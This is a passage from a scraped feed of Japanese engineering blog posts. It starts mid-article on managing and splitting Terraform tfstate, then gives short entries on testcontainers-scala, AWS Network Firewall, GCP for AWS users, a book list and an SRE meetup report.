Type: gcs | Terraform | HashiCorp DeveloperGitLabGitLabでtfstateを監理することもできます。tfstateを管理するリソースを管理する必要がないことがメリットとなります。(後述します)開発にGitLabを使っている場合、親和性が高い方法となります。参考: GitLab-managed Terraform state | GitLabTerraform CloudGitLabと同様tfstateを管理するリソースを管理する必要がないというところにメリットがあります。月間500 Managed Rsourcesまで無料で使えます。参考: HashiCorp Terraform: Enterprise Pricing, Packages & Featuresweb上からリソース差分の確認できたり、applyが可能です。SaaSにクラウドのリソース情報を預けることに抵抗がない場合は選択肢としては有望です。なおTerraformのStateのドキュメントではこういう記述があり、Terraform Cloudを推奨しているようです。This state is stored by default in a local file named "terraform.tfstate", but we recommend storing it in Terraform Cloud to version, encrypt, and securely share it with your team.参考: State | Terraform | HashiCorp Developer昔はAWSと連携するためにIAM Userのアクセスキーを使わないといけなかったが、OIDC認証もできるようになったので、よりやりやすくなったかと思います。参考: Terraform Cloud Adds Dynamic Provider Credentials for Vault and Official Cloud Providers参考: Terraform Cloud | Terraform | HashiCorp Developertfstateを管理するリソースをどう管理する問題GitLabやTerraform Cloudを使う場合には起きない問題となります。S3のようなクラウドのオブジェクトストレージを使用する場合は、このS3バケットをどう作るかということが問題となります。コマンドで作る場合、コマンドの管理、terraformで作る場合はそのtfstateはどこに保存するか、そういったことに頭を悩ませます。そこについて考えていきます。以下の方法が考えられます。aws/gcloudコマンドterraform + local state管理CloudFormationaws/gcloud コマンドそもそも作成コマンドしか打たないのであれば、スクリプトをレポジトリに含めておけば良いという考え方はあります。基本的に一度作れば変えることはないので、これで十分という風に割り切ることはできます。ただし、tfstateのバケットだけでなく、CI/CD用のIAM RoleやOIDC認証リソースなども初期リソースとして含めて管理したいというユースケースだと、スクリプト管理では力不足になりうります。terraform + local state 管理オブジェクトストレージをterraformで作る方法です。ただし、tfstateに関してはlocalに保存し、これをgitも管理します。かたくなにterraformを使いたい人に向けな方法となります。デメリットとしては、tfstateもgit管理するのでコミット忘れがあります。また、頻度低いですがterraform自体はローカルで実行せざるを得ないので変更衝突が起きうることです。CloudFormation / Google Deployment Managerクラウドごとにコードを変えないといけない。IaCツールを2種類使うというそこはかとない気持ち悪さはあるというデメリットはありますが、gitでインフラ状態管理しなくてすむというメリットがあります。気持ち悪さだけを克服できるなら無難な選択肢だとは思います。tfstateをどう分割するか問題第一に考えるのが環境の分離。この分離の仕方だけ他とは系統が違うので独立して説明します。一部差分があるだけで、以下のような形でほぼ同じ構成の環境を作ることはよくあります。開発環境ステージング環境本番環境これらについてどう分割するのかを考えていきます。環境分離パターン大きく2つのパターンを利用することが多いです。それぞれ見ていきます。ディレクトリ分離パターンbackend-configパターンディレクトリ分離パターンこれは環境ごとにディレクトリを分割して、環境ディレクトリを実行単位とします。環境の切り替えはディレクトリ移動することで行います。環境ごとの差分が大きいときに使うことが多いです。デメリットとしては環境ごとにリソース定義をそれぞれ書くので記述量が多くなるというのがあります。そのため、可能な限りモジュール化して、なるべくパラメータだけの差分にするようにします。ディレクトリ構成例としては以下の通りです。.├── envs│   ├── dev│   │   ├── locals.tf│   │   ├── main.tf│   │   ├── outputs.tf│   │   └── variables.tf│   ├── prd│   │   ├── locals.tf│   │   ├── main.tf│   │   ├── outputs.tf│   │   └── variables.tf│   └── stg│       ├── locals.tf│       ├── main.tf│       ├── outputs.tf│       └── variables.tf└── modules    ├── vpc    │   ├── locals.tf    │   ├── main.tf    │   ├── outputs.tf    │   └── variables.tf    ├── application    │   ├── locals.tf    │   ├── main.tf    │   ├── outputs.tf    │   └── variables.tfbackend-configパターンbackend-configオプションとvars-fileオプションを組み合わせて、環境を切り替えるパターンです。${ENVDIR}/terraform.tfvars に環境ごとの差分パラメータを定義して、${ENVDIR}/backend.tfvars に環境ごとのtfstate保存先を定義します。terraform init で backend.tfvars を切り替えることで環境の切り替えを行います。環境ごとに差分が少ないときに向いています。差分は terraform.tfvars に記述されているパラメータだけなので、記述量が少なくて済みます。ただし差分が多くなるとcount, for_eachで分岐やループを作ることになり読みにくくなるというものがあります。ディレクトリ構成例としては以下のようになります。.├── envs│   ├── dev│   │   ├── backend.tfvars│   │   └── terraform.tfvars│   ├── prd│   │   ├── backend.tfvars│   │   └── terraform.tfvars│   └── stg│       ├── backend.tfvars│       └── terraform.tfvars├── locals.tf├── main.tf├── modules│   └── vpc│       ├── locals.tf│       ├── main.tf│       ├── outputs.tf│       └── variables.tf├── outputs.tf├── provider.tf└── variables.tf設定ではbackendをs3と指定しておき中身はオプションで指定するようにします。terraform {  backend "s3" {}}以下のようにterraform initするたびに適用する環境を切り替えることができる。terraform init --backend-config=${ENVDIR}/backend.tfvars --reconfigureterraform apply --var-file=${ENVDIR}/terraform.tfvarsworkspaceworkspaceは同じような環境を複製するときに使ういます。シングルテナント環境を量産する場合や開発環境を複数作る場合などに使います。環境を切り替える用途には作られてないとドキュメントまでは記載されています。参考: Managing Workspaces - Terraform CLI | Terraform | HashiCorp DeveloperIn particular, organizations commonly want to create a strong separation between multiple deployments of the same infrastructure serving different development stages or different internal teams. In this case, the backend for each deployment often has different credentials and access controls. CLI workspaces within a working directory use the same backend, so they are not a suitable isolation mechanism for this scenario.自分自身がworkspaceを実運用で使ったことがないので多くは語れないです。別でちゃんと使ってから書きたいと思います。参考: State: Workspaces | Terraform | HashiCorp Developer環境分離以外の分割をどうするか問題小さいサービスでは環境を分離するだけでだいたいは問題ないことがおおいですが、terraformを運用していると運用面、管理面でいろいろ課題が出てくると思います。管理するリソースが増えるとplan/applyの時間が増えたり、リソースの見通しが悪くなったりしてきます。特に実行時間が意外に馬鹿にできなかったりします。下手するとplanに数分かかるようになったりします。そのため、ある程度大きくなったらtrstateを分割して、リソースの管理範囲を分割する必要が出てきます。これをどうやって分割するかが自分の中で答えが出ていない出てないし、分脈によって解決策は異なるとは思います。ここで、解決策を考えるうえで、分割するための観点を見ていきましょう。分割する観点分割する観点は以下のようなものがあるかと思います。プロバイダー管理権限変更頻度プロバイダーで分割プロバイダー単位で分割するパターンです。例としてはAWSとDatadogのようにプロバイダーで分割します。プロバイダー間で依存がない場合は分けやすいかと思います。また、プロバイダー間で管理主体が違うことも多いので素直な分け方だとは思います。しかしながら、アプリケーションリソースとアプリケーションの監視を近いところにおいたほうが見通しがよいのではという観点もあるので運用体制にあわせて考えるとよいでしょう。管理権限で分割チームの権限で分割するパターンです。ただし、より堅くするなら、ディレクトリではなくレポジトリ自体も分割して、コードの参照権限も分割する方が望ましい場合もあります。例ネットワーク ⇒ インフラチームアプリケーション ⇒ 開発チーム変更頻度で分割変更をあまりしないリソースを変更が頻繁なリソースと一緒のplan/applyするのは無駄なので変更の頻度でtfstateを分割するパターンもあります。例変更が少ない ⇒ DB/ネットワーク変更が多い ⇒ EC2/ECS依存の方向性で分割少し観点を変えてみます。実際に分割をした場合に問題となるのはtfstate間のリソースの依存が課題になります。tfstate間で相互に依存するようなコードを書くとtarget指定してそれぞれのstateのリソースを作成しなくてはなりません。こうすると管理が煩雑となってしまうので、原則的に片方向だけの依存になるように分割するようにするのが望ましいです。tfstate間のリソース参照terraform_remote_state を使うことで、参照元のTerraformでoutputした内容を別のTerraformで利用することができます。# 参照元 networkアカウントoutput "vpc_id" {  value = aws_vpc.main.id}# 参照先 applicationアカウント# data.terraform_remote_state.network.vpc_id の形式でVPC IDを参照できるdata "terraform_remote_state" "network" {  backend = "s3"  config {    bucket = "terraform-tfstate-network-xxxxx"    key    = "tfstate"    region = "ap-northeast-1"  }}まとめ正直tfstateをどう扱うかに正解はないです。サービス規模や性質によって選択は変わります。本当に小さい規模であれば、tfstateを分割せず一つで十分でしょうし、チーム開発せず一人で扱うなら、通常であれば推奨されないtfstateのlocal git管理という手段がふさわしい場合もあります。また、組織やサービスの成長や時間経過によっても最適な選択は変わると思います。大事なのは選んだ技術要素に関しては選定理由を説明できるようにはしておくということです。選定理由及び不採用理由を明確にしておくことで、変更時に最適な選択の助けになるでしょう。]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[testcontainers-scala で快適なインテグレーションテストを実現する]]></title>
            <link>https://zenn.dev/nomadblacky/articles/173ea1f829eafa</link>
            <guid>https://zenn.dev/nomadblacky/articles/173ea1f829eafa</guid>
            <pubDate>Fri, 22 Dec 2023 13:07:06 GMT</pubDate>
            <content:encoded><![CDATA[この記事は、3-shake Advent Calendar 2023 の 22 日目の記事です。 はじめに私の所属する株式会社スリーシェイクでは、Reckoner というデータパイプライン構築の SaaS を開発しています。https://reckoner.io/「SaaSをつなぐ。業務が変わる。ビジネスが進化する。」直感的なユーザーインターフェイスで、多種多様な SaaS のデータをつなぎ合わせることで、データ活用・データの民主化を実現します。 課題Reckoner では、データの取得・加工・保存部分を Scala で実装しており、データの連携先として、MySQL ...]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[AWS Network Firewall と NAT ゲートウェイの配置]]></title>
            <link>https://zenn.dev/toshikish/articles/d7d15cd01a8584</link>
            <guid>https://zenn.dev/toshikish/articles/d7d15cd01a8584</guid>
            <pubDate>Fri, 22 Dec 2023 07:17:39 GMT</pubDate>
            <content:encoded><![CDATA[はじめにAWS Network Firewall（以下 NWFW）の導入例を探してアーキテクチャ図を眺めていると，説明されている図によって NAT ゲートウェイ（以下 NATGW）との配置がまちまちであることに気づきます。つまり，プライベート・パブリックサブネットのシンプルな構成の場合，インターネット宛ての通信経路は大別するとプライベートサブネット→ NATGW→ NWFW →インターネットプライベートサブネット→ NWFW → NATGW →インターネットの2種類が存在します。それぞれのアーキテクチャの違いと，どちらを選定すべきかの指針についてまとめます。 1....]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[社内チャットツールでGemini Proが使えるようになった話]]></title>
            <link>https://sreake.com/blog/gemini-pro-introduction/</link>
            <guid>https://sreake.com/blog/gemini-pro-introduction/</guid>
            <pubDate>Thu, 21 Dec 2023 08:49:07 GMT</pubDate>
            <content:encoded><![CDATA[1. はじめに はじめまして、Sreake事業部インターン生の井上です。私はSreake事業部にてSRE技術の調査と研究を行う目的で2023年3月6日から長期インターン生として参加しています。 本記事では、社内チャットツ […]The post 社内チャットツールでGemini Proが使えるようになった話 first appeared on sreake.com | 株式会社スリーシェイク.]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[WIP: 2023年 俺が愛した本たち 非技術書編]]></title>
            <link>https://syu-m-5151.hatenablog.com/entry/2023/12/21/165021</link>
            <guid>https://syu-m-5151.hatenablog.com/entry/2023/12/21/165021</guid>
            <pubDate>Thu, 21 Dec 2023 07:50:21 GMT</pubDate>
            <content:encoded><![CDATA[この記事は、3-shake Advent Calendar 2023 21日目のエントリ記事です。はじめにプログラマー脳エンジニアのためのドキュメントライティング達人プログラマー 第2版スタッフエンジニアプロジェクト ヘイルメアリーサーキット・スイッチャー可燃物大規模言語モデルは新たな知性か？ブラジャーで天下をとった男さいごにはじめに2023年が終わろうとしています。年の瀬になると、いつも一年を振り返ることが私の習慣です。技術書に続いて、今年はさまざまな非技術書にも手を伸ばしました。小説や歴史、哲学、芸術の本など、多くのジャンルの本を読むことで、心が豊かになったと感じています。これらの本は、技術的なことだけではなく、人生について深く考えるきっかけをくれました。異なる文化や、普段とは違う視点の物語に触れることで、新しい考え方を学びました。これらの本が、私の考えを広げ、日々の生活に新しい刺激を与えてくれました。技術書と一緒に、これらの本も私のエンジニアとしての知識を形成する大切な部分になりました。2023年は、技術だけでなく、人生の学びにも終わりがないことを感じた一年でした。非技術書から得たことは、技術書から学んだことと相まって、私の理解を深めてくれました。読書を通じて得たこれらの経験は、来年もまた新しい発見への旅に私を連れて行ってくれるでしょう。そして、来年もまた、本とともに充実した一年になることを楽しみにしています。プログラマー脳『プログラマー脳 ～優れたプログラマーになるための認知科学に基づくアプローチ』は、プログラミングのスキル向上に認知科学の手法を応用した、画期的な書籍です。この本は、プログラマーがプログラムを読み書きする際に経験する認知的プロセスを深く掘り下げ、熟達したプログラマーと初心者の違いを明確に示しています。著者は、具体的なプログラミング技法や設計手法の直接的な説明を超え、認知のメカニズムを理解し活用することにより、プログラミングの学習と実践の改善を目指しています。プログラマー脳 プログラマーになるための認知科学に基づくアプローチノーブランド品Amazon本書の強みは、抽象的な概念を具体的な実例や演習を交えて解説することで、読者が新しいアイデアを自然に理解し、実践的な知識として身につけるのを助ける点にあります。また、プログラミングに関連する認知科学的な概念を、実際のプログラミングの状況にどのように適用するかについて、具体的かつ実用的なアドバイスを提供しています。こうしたアプローチは、読者がプログラミングに関する洞察を深め、より効率的かつ効果的に技術を習得する手助けをします。この本で特に興味深いのは、「意味波」という概念です。これは、新しい概念や技術を学ぶ過程で、抽象から具象、そして再び抽象へと進むプロセスを指します。このプロセスは、学習者が情報を受け取るだけでなく、それを自分の既存の知識や経験と結びつけ、より高い次元の理解へと昇華させるのに役立ちます。このアプローチは、新しい技術やアイデアを単に学ぶのではなく、それらを既存の知識構造に組み込んで深い理解を得ることに重点を置いています。他にも面白い概念や考え方が多いので、ぜひ読んでみてください。本書は、プログラミングにおける認知的側面を深く掘り下げることで、新しい学習法やスキル向上のアプローチを提供します。これにより、プログラミングのスキルを深め、熟達したプログラマーになるための貴重な知識と洞察を提供しています。『プログラマー脳』を読んで面白いと感じた方は、『言語の本質-ことばはどう生まれ、進化したか』も読んでみてください。『言語の本質-ことばはどう生まれ、進化したか』は、言語の起源と進化に焦点を当てた別の注目すべき書籍です。この本は、言語が人間にとってどのように重要なコミュニケーションツールとして発展してきたのかを探求しています。特に、オノマトペやアブダクション推論という人間特有の学びの力に焦点を置き、言語の進化と子どもの言語習得を通じて人間の根源に迫ります。著者は、言語の起源と進化に関する深い知見を提供し、言語が単なるコミュニケーションツール以上のものであること、すなわち、私たちの認知と感情、文化に深く根差した現象であることを明らかにします。言語の本質　ことばはどう生まれ、進化したか (中公新書)作者:今井むつみ,秋田喜美中央公論新社Amazon本書は、言語の抽象性や体系性、さらには言語がどのようにして複雑なシステムへと発展してきたのかを解明しています。これらのトピックを通じて、読者は言語の複雑な構造と機能、そして人間の認知プロセスとの関連を理解することができます。この本は、言語学、認知科学、心理学に興味を持つ読者にとって、知識の深化と洞察の拡大に貢献するでしょう。それぞれ異なる領域において人間の認知能力と学習の本質に深く切り込んでいる『プログラマー脳』と『言語の本質』に加えて、『進化心理学から考えるホモサピエンス 一万年変化しない価値観』も非常に興味深い本です。『プログラマー脳』では、プログラミングの習得と実践に認知科学を適用し、『言語の本質』は言語の起源と進化を探求することで人間の認知プロセスを解析しています。これらの本は、それぞれの分野において新たな洞察を提供し、読者の理解とスキルの向上に貢献します。進化心理学から考えるホモサピエンス　一万年変化しない価値観作者:アラン・S・ミラーパンローリング株式会社Amazon『進化心理学から考えるホモサピエンス 一万年変化しない価値観』は、進化心理学の観点から、人間の行動や価値観がどのように進化してきたかを探る一冊です。この本は、私たちの行動や意思決定に影響を与える進化的適応について深く掘り下げ、現代の社会や文化における人間の行動パターンを進化心理学的視点から分析します。この並びで本書を紹介するのは、伊藤計劃の『虐殺器官』が『言語学、進化心理学SFの傑作である』ためで、この本は人生を変えるぐらい面白い本だったからです。また、『ゆる言語学ラジオ』も聞いており、とても良かったのでおすすめです。www.youtube.comエンジニアのためのドキュメントライティングDocs for Developers: An Engineer’s Field Guide to Technical Writingの翻訳本です。書いた書評のブログ記事では、この本が良いドキュメントの特徴を架空の開発チームのストーリーを通して教えることで、読者にドキュメンタリアンとしての情熱を呼び起こすと評価されています。syu-m-5151.hatenablog.com原著は読んでないです。やっててよかったO'Reillyサブスクは原著版のみあります。learning.oreilly.comまた、技術ドキュメントではないいですが『三行で撃つ 〈善く、生きる〉ための文章塾』もおすすめです。この本は読者に向けた独特なアプローチで、文章技術の向上を目指す実用書です。作家の近藤康太郎氏によるこの本は、ただのテクニック本にとどまらず、書くという行為を通じて自己の実存を考えさせられる思想書としての側面も持ち合わせています。文章テクニックだけでなく、企画の立て方、時間・自己管理術、インプットの方法、思考の深め方に至るまで幅広くカバーし、リリカルな思想とロジカルな技術を融合させています。また、他人の目で空を見ず、自分だけの言葉で書くことの重要性や、「説明しない技術」を身に付けることの必要性を強調し、読者が自然に感情を動かされる文章を書くための技術を教えてくれます。文章を通じて善く生きるための深い洞察を提供する、稀有な一冊です。技術ドキュメントとの差異が分かるので理科系の作文技術や数学文章作法などと一緒に読むと自分がその時に書くべき文章がわかってくる。www.youtube.com同著者の近藤康太郎の『百冊で耕す 〈自由に、なる〉ための読書術』は、読む行為を通じて自己を見つめ、新しい自己を発見するための思想書としても機能します。速読や遅読、批判的読書や没入的読書など、対立する読書法を探求し、それらを融合させることで多面的な読書体験を提案しています。近藤氏は、「本は百冊あればいい」と述べ、読者に自分にとってのカノン(聖典)100冊を選び、深く読み込むことで、知識を内面化し、己の一部にする方法を説いています。本書は、読書のご利益を探求し、勉強、孤独、愛、幸せ、生きることについての疑問を掘り下げ、読むことで自分が変わり、他者や世界を愛する新たな自分を発見する旅を提案しています。達人プログラマー 第2版『達人プログラマー ―熟達に向けたあなたの旅― 第2版』は、David ThomasとAndrew Huntによる名著で、ソフトウェア開発者がより効率的かつ生産的になるための実践的アプローチを提供する一冊です。本書は特に今年読んだわけではないものの、非常に多く引用して、活用している価値のある本としてあげておきます。プログラマーとしての技術面だけでなく、問題解決の姿勢やプロフェッショナリズムについても深く掘り下げています。例えば、「猫がソースコードを食べちゃった」というセクションでは、責任を持つ重要性を強調し、「石のスープとゆでガエル」では、プロジェクト進行の重要なポイントを示唆します。また、「伝達しよう！」のセクションでは、効果的なコミュニケーションの重要性を説いています。また、プロジェクトマネジメントやチームワーク、プロフェッショナルとしての姿勢に関する深い洞察を提供し、エンジニアとしてのキャリアを積む上での貴重な指針となります。本書はあまりに網羅的な内容のため、各セクションに関連する本での補完が必要だと思います。しかし、特に技術系のポエム記事に触れたことがある読者には、この一冊を深く読み込むことを強くお勧めします。『達人プログラマー』は、プログラマーだけでなく、あらゆるソフトウェア開発に関わる全ての人にとって、読む価値のある一冊です。『SOFT SKILLS ソフトウェア開発者の人生マニュアル 第 2 版』も同様にオススメですがこちらの方がバラエティに富んでいるのでちょっとエンジニアリング以外のコラムも読みたい方はこちらの方がオススメです。達人プログラマー ―熟達に向けたあなたの旅― 第2版作者:David Thomas,Andrew Huntオーム社Amazonスタッフエンジニア『スタッフエンジニア　マネジメントを超えるリーダーシップ』はWill Larsonによる本で、エンジニアリングキャリアのシニアレベル以上を目指す人にとって重要な指針を提供する一冊です。Will Larsonは、EM（エンジニアリングマネージャー）としてのチームのつくりかた、VPやDirectorとしての組織のつくりかたに関する洞察を提供する『An Elegant Puzzle』の著者でもあります。本書の洋書版を読む気力がなかった私にとって、翻訳本の出版はありがたいことでした。また、LarsonのHow to invest in technical infrastructureという記事も、共通基盤への投資方法について記述しており、非常に参考になるためオススメです。さて、本の内容に戻りますと、第1章ではスタッフエンジニアの役割とその意味を深く掘り下げ、技術力だけでなく組織内での影響力とリーダーシップの重要性を強調しています。これらの役割をどのように達成し、キャリアを前進させるかについて詳細に説明しており、特に印象的なのは、「スタッフエンジニアになれば自分の仕事を自分で管理でき、誰もがあなたに従い、あなたの望むことをするようになると考えたら大間違いだ」という言葉です。これはスタッフエンジニアの役割に関する一般的な誤解を解き明かしています。さらに、シニアエンジニアからスタッフプラスエンジニアへの進化を探る第3章、転職の決断を考慮する第4章、そして現役スタッフエンジニアのインタビューを通じて彼らの日常と役割の変化を深く掘り下げる第5章が続きます。全体を通して、この本は技術的なキャリアパスにおいてマネジメントの道を選ばないエンジニアにとって、必読の書です。各章は、スタッフエンジニアとしての役割を深く理解し、実現するための具体的な手法を提供しています。この本は、私のような経験豊富なエンジニアにとっても新たな学びとなり、これからのキャリアにおいて大いに参考になります。スタッフエンジニア　マネジメントを超えるリーダーシップ作者:Will Larson日経BPAmazonプロジェクト ヘイルメアリーTBDサーキット・スイッチャーTBD可燃物TBD大規模言語モデルは新たな知性か？TBDブラジャーで天下をとった男TBDさいごにこの年、多くの非技術書に没頭することで、私は内面的な成長と感情の豊かさを体験しました。各々の書籍が示した独特の感性や深い感動は、私の人間性を拡げ、心を満たしてくれました。皆さんからの心に残る作品の推薦も、来年の読書リストに追加し、楽しみにしています。読書はただの趣味にとどまらず、私たちの感情や人格を育て、深める重要な行為です。来年も、私と一緒に、心の成長と感動の旅に出ましょう。2024年も感動に満ちた読書の時を過ごし、新しい自分を見つけ、心の成長を遂げる一年となりますように。]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[テーブル構造変更に伴う認可・権限管理を設計実装してみて思ったこと]]></title>
            <link>https://qiita.com/bayobayo0324/items/a2fcc5eee9930bd2009a</link>
            <guid>https://qiita.com/bayobayo0324/items/a2fcc5eee9930bd2009a</guid>
            <pubDate>Tue, 19 Dec 2023 22:00:39 GMT</pubDate>
            <content:encoded><![CDATA[※この記事は3-shake Advent Calendar 2023の20日目の記事ですはじめまして、@bayobayo0324 です。株式会社スリーシェイクでクラウド型データ連携ツール「Rec…]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[AWS経験者がGCPに入門]]></title>
            <link>https://shu-kob.hateblo.jp/entry/2023/12/19/190734</link>
            <guid>https://shu-kob.hateblo.jp/entry/2023/12/19/190734</guid>
            <pubDate>Tue, 19 Dec 2023 10:07:34 GMT</pubDate>
            <content:encoded><![CDATA[この記事はGCP(Google Cloud Platform) Advent Calendar 202320日目の記事です。私は12月1日に株式会社スリーシェイクに入社した、小渕と申します。GCPは初心者ですが、スリーシェイクはGCPパートナー企業なので、しっかりキャッチアップして頑張ってまいります。今回の記事は、AWSは触ったことあるけど、GCPは初めてという私がGCPの印象や、AWSとGCPのマネージドサービスの対応などを、これから入門する方のためにも記しておきたいと思います。印象GCPを触ってみたり、ドキュメントを読んだり、Cloud Digital Leaderの試験勉強をしていく中で思ったことは、SREの考え方がよく出てくるということです。SRE（Site Reliability Engineering）はGoogle発祥ということもあり、Cloud Digital Leader模擬試験でもよく目にしました。また、AWSに比べると、Kubernetesもよく目にします。KubernetesはGoogle 内部で利用されているクラスタマネージャの Borg を元に 2014 年に開発されたこともあり、Kubernetes使うならGCPが一番というイメージです。それから、BigQueryは一般公開データセットもあり、GCPの強みというイメージです。入門書GCP入門のオススメ書籍として、社内ドキュメントに載っていた「図解即戦力　Google Cloudのしくみと技術がこれ1冊でしっかりわかる教科書」をKindle版で読んでいます。技術書はKindleで読みにくいものもありますが、これは読みやすく、GCPの概要を掴めるかと思います。AWSとの比較無料利用枠クラウドの使い始め、AWSは無料利用枠を超えると通常の課金が発生しますが、GCPは無料利用枠を超えるとサービスが使えなくなるため、課金される心配がありません。これはAzureもGCPと同様です。仮想マシンAWSではEC2インスタンスを立てますが、GCPはCompute Engineという名前です。「インスタンス」という言葉もAWSと同様に使います。ECSとCloud RunAWS上でコンテナを稼働させるマネージドサービス「Amazon Elastic Container Service」（ECS）ですが、GCPではCloud Runになるでしょうか。ECSのFargateがCloud Runに対応しているイメージです。Cloud Runは早速業務で使用していますが、ECSよりも管理が楽だという印象を受けました。サーバーレスAWSでお馴染みLambdaですが、GCPではApp Engineでしょうか。App Engineはスタンダード環境とフレキシブル環境があり、フレキシブル環境はSSH接続ができるとか！また、App EngineはBlue-Greenデプロイメントに基づいて行われるのですね！AnthosGCPでAnthosというサービス名もよく目にしますが、オンプレやAWSやAzureなど他のパブリッククラウドと接続してマルチクラウドが実現できるんですね。GKE(Google Kubernetes Engine)で統一したプラットフォームを構築するので、マルチクラウド、ハイブリッドクラウドが他のクラウドを拠点にするよりもやりやすいのではないでしょうか？最後にGCP初心者ですが、クラウド触るのは好きなので、習得していきたいと思います！初心者の記事ですが、読んでいただきありがとうございました！]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[terraform test: 細かい挙動]]></title>
            <link>https://zenn.dev/kyohei_saito/articles/eac62818b7217d</link>
            <guid>https://zenn.dev/kyohei_saito/articles/eac62818b7217d</guid>
            <pubDate>Mon, 18 Dec 2023 14:58:00 GMT</pubDate>
            <content:encoded><![CDATA[この記事は 3-shake Advent Calendar 2023 19 日目の記事です！ この記事に書いてあることこの記事を含め 3 回に渡って terraform test の機能を紹介します。terraform test: 基本機能terraform test: 応用機能terraform test: 細かい挙動 <- 今ここ はじめに前回の記事では、 terraform test の応用的な機能の紹介をしました。この記事では、 terraform test の挙動について説明します。 terraform test: 細かい挙動 state...]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[3-SHAKE SRE Tech Talk #8レポート（k8sの話もたくさん）]]></title>
            <link>https://shu-kob.hateblo.jp/entry/2023/12/18/234306</link>
            <guid>https://shu-kob.hateblo.jp/entry/2023/12/18/234306</guid>
            <pubDate>Mon, 18 Dec 2023 14:43:06 GMT</pubDate>
            <content:encoded><![CDATA[この記事はKubernetes Advent Calendar 202319日目の記事です。私は12月1日に株式会社スリーシェイクに入社した、小渕と申します。kubernetesは初心者ですが、Sreake事業部のSREとしてしっかりキャッチアップして頑張ってまいります。3-shake.connpass.comさて、12月18日に弊社の勉強会「3-shake SRE Tech Talk #8」が行われました。半分以上はKubernetesの話だったので、この勉強会の話題を書きたいと思います。↓開催中メモ代わりにX(旧Twitter)への自分の投稿はこちら（全部スレッドで連なっています）19時から弊社スリーシェイクの勉強会を開催します！お時間のある方は是非ご参加ください！https://t.co/wu271V6Pbw#SRETT— Shu Kobuchi(こぶシュー) (@shu_kob) 2023年12月18日   Xにて#SRETTで検索した投稿(最新)はこちら↓セッション毎に分けて、書いてます。スリーシェイク技術顧問 青山真也さん「KubeCon + CloudNativeCon NA 2023 Sessions for Site Reliability Engineers」最初はメインセッション。スリーシェイク技術顧問で、サイバーエージェントの青山真也さん「KubeCon + CloudNativeCon NA 2023 Sessions for Site Reliability Engineers」kubernetesユーザの方にはお馴染み、日本のkubernetesの第一人者の方です。↓スライドはこちら speakerdeck.com冒頭、ちらっとKubernetes完全ガイド第3版の話が進んでいるという「おお！」となるお話も！↑こちらは第2版です。k8sユーザのバイブルですよね。私も紙書籍版を持っています。楽しみですね！さて、セッションの内容としては、イベントのご紹介、参加者数の推移から、Keynoteで発表された2023年3月のDatadogの障害の話へ。全てのデータセンターで60%のnodeが1時間ダウンした大規模な障害だったそう。恐ろしいですね！！DatadogのK8sクラスタのnodeはUbuntu 22.04にVer. UP Rolloutをしていっているが、20.04と22.04の間にあった必要のないルーティングポリシーを消す変更があり、障害に繋がったとのことです。Auto Scalingが走って、救われた面もあるが、50%強のスケールアウトを一気にしようとすると課題も多々ありました。他人事ではなく、障害時に復旧するレベルでオートスケールを設計する必要がある、というのが教訓でした！二つ目のお話「OpenTelemetry」OpenTelemetryとは、Traceデータを収集するSDKで、YAMLで書くよりも、OTTLで書くと、コードの記述量が少なくて済むメリットも！PrometheusからOpenTelemetry Collectorに置き換えると、約1/5にリソース消費を抑えられるなどのメリットもあるそうです。ただし、Otelは多少バグがあるので使用上は注意とのことでした。他に、Argoの話もしてくださいました。Config Management Plugins(CMP)を使うと、HelmやKustomizeでない任意のツールでArgoCDと連携できるとのこと！青山さんのメインセッションの後は、6名の方のLT！社外の方3名、社内3名です。スリーシェイク高村さん「障害対応のススメ」 speakerdeck.com新人SREはエキスパートSREとペアで障害対応しよう！というお話。ペアで障害対応することにより、新人だけでなく、エキスパートSREも自分だけでは把握しきれない分も把握できます。「ペアプログラミング」ならぬ「ペア障害対応」いいですね！ポストモーテム作成も！私もスリーシェイクの一員として早くやってみたいですね！ペア障害で属人化解消というメリットもあります！incident-response.connpass.com「Incident Response Meetup vol.1」という良さげな勉強会もあるのとのこと！でした！mixi 清水さん「今年1年のEKS運用振り返り」 speakerdeck.commixiさんのサービス「みてね」はEKSを使用しているそうで、運用の苦労話も聞けました。OOMKilledが起こることもあり、CPU、メモリ等リソース調整しないといけないのは大変ですね。Railsアプリはメモリを食い、再起動かからないとメモリ消費が増えてくるそうです。定期的に再起動かけるようにして対応したそうです。手動運用でアップデートが放置されがちだった箇所も、自動アップデートもできるようにしたのはすごいですね。kubectlでPod作業するのを禁止したりだとか。その代わり踏み台からのアクセスできるようにしたり。k8s運用の勉強になりました。スリーシェイク bells17さん「KubernetesとCoreDNS」 speakerdeck.com自分もEKSでCoreDNSのステータス低下問題に悩まされたことがあったので、ありがたいお話でした。bells17さんお得意のK8sのコードリーディングでCoreDNSのロジックに迫っていってました。CoreDNSのデプロイからnameserverにIPアドレスを設定するまでの流れと、CoreDNSによるService/Podの名前解決を解説してもらいました。Kubernetes 側で定義されている DNS の仕様に従って、CoreDNS 側で Kubernetes 用の plugin が実装されてるとのこと。私もkubernetesの力をつけて、bells17さんの話を理解できるように頑張っていきます！ZLab yosshi_さん「Grafana Agent を用いた Continuous Profiling」qiita.comqiita.comGrafana Agentで eBPF が使われているそうです。eBPF だと kernel level で情報がとれるので、より詳細な情報を取れるのではないか、という期待があるとのことでした。Grafana Agentのgolang pullもあり、対象言語はGo言語のみで、取得対象はpprofの情報になるので、CPU以外にもメモリ等の情報も収集可能とのことでした。スリーシェイク まさすずさん「Terraform使いがPulumiに入門する」 speakerdeck.comTerraform(HCL)の記述力に限界を感じていたので、Pulumiを使い始めた。とのことでした。Pulumiとは任意のプログラミング言語でインフラ構築可能なプロビジョニングツールです。TerraformやAnsibleなどインフラのツールって柔軟性に欠けるので、任意のプログラミング言語で柔軟にインフラ構築できるのはいいですよね！Pulumi Cloudは個人で使う分には無料とのことでした！FLUX cstokuさん「へーしゃで起こったGoogle Cloud課金事故事例」Cloud Logging で Log Storage cost が爆増。ログレベル Debug でメッセージが出力されるバッチが (バグで) 何回も呼ばれるようになっていた、とのことでした。Cloud Loggingではログレベルに気をつけましょう！また、Cloud 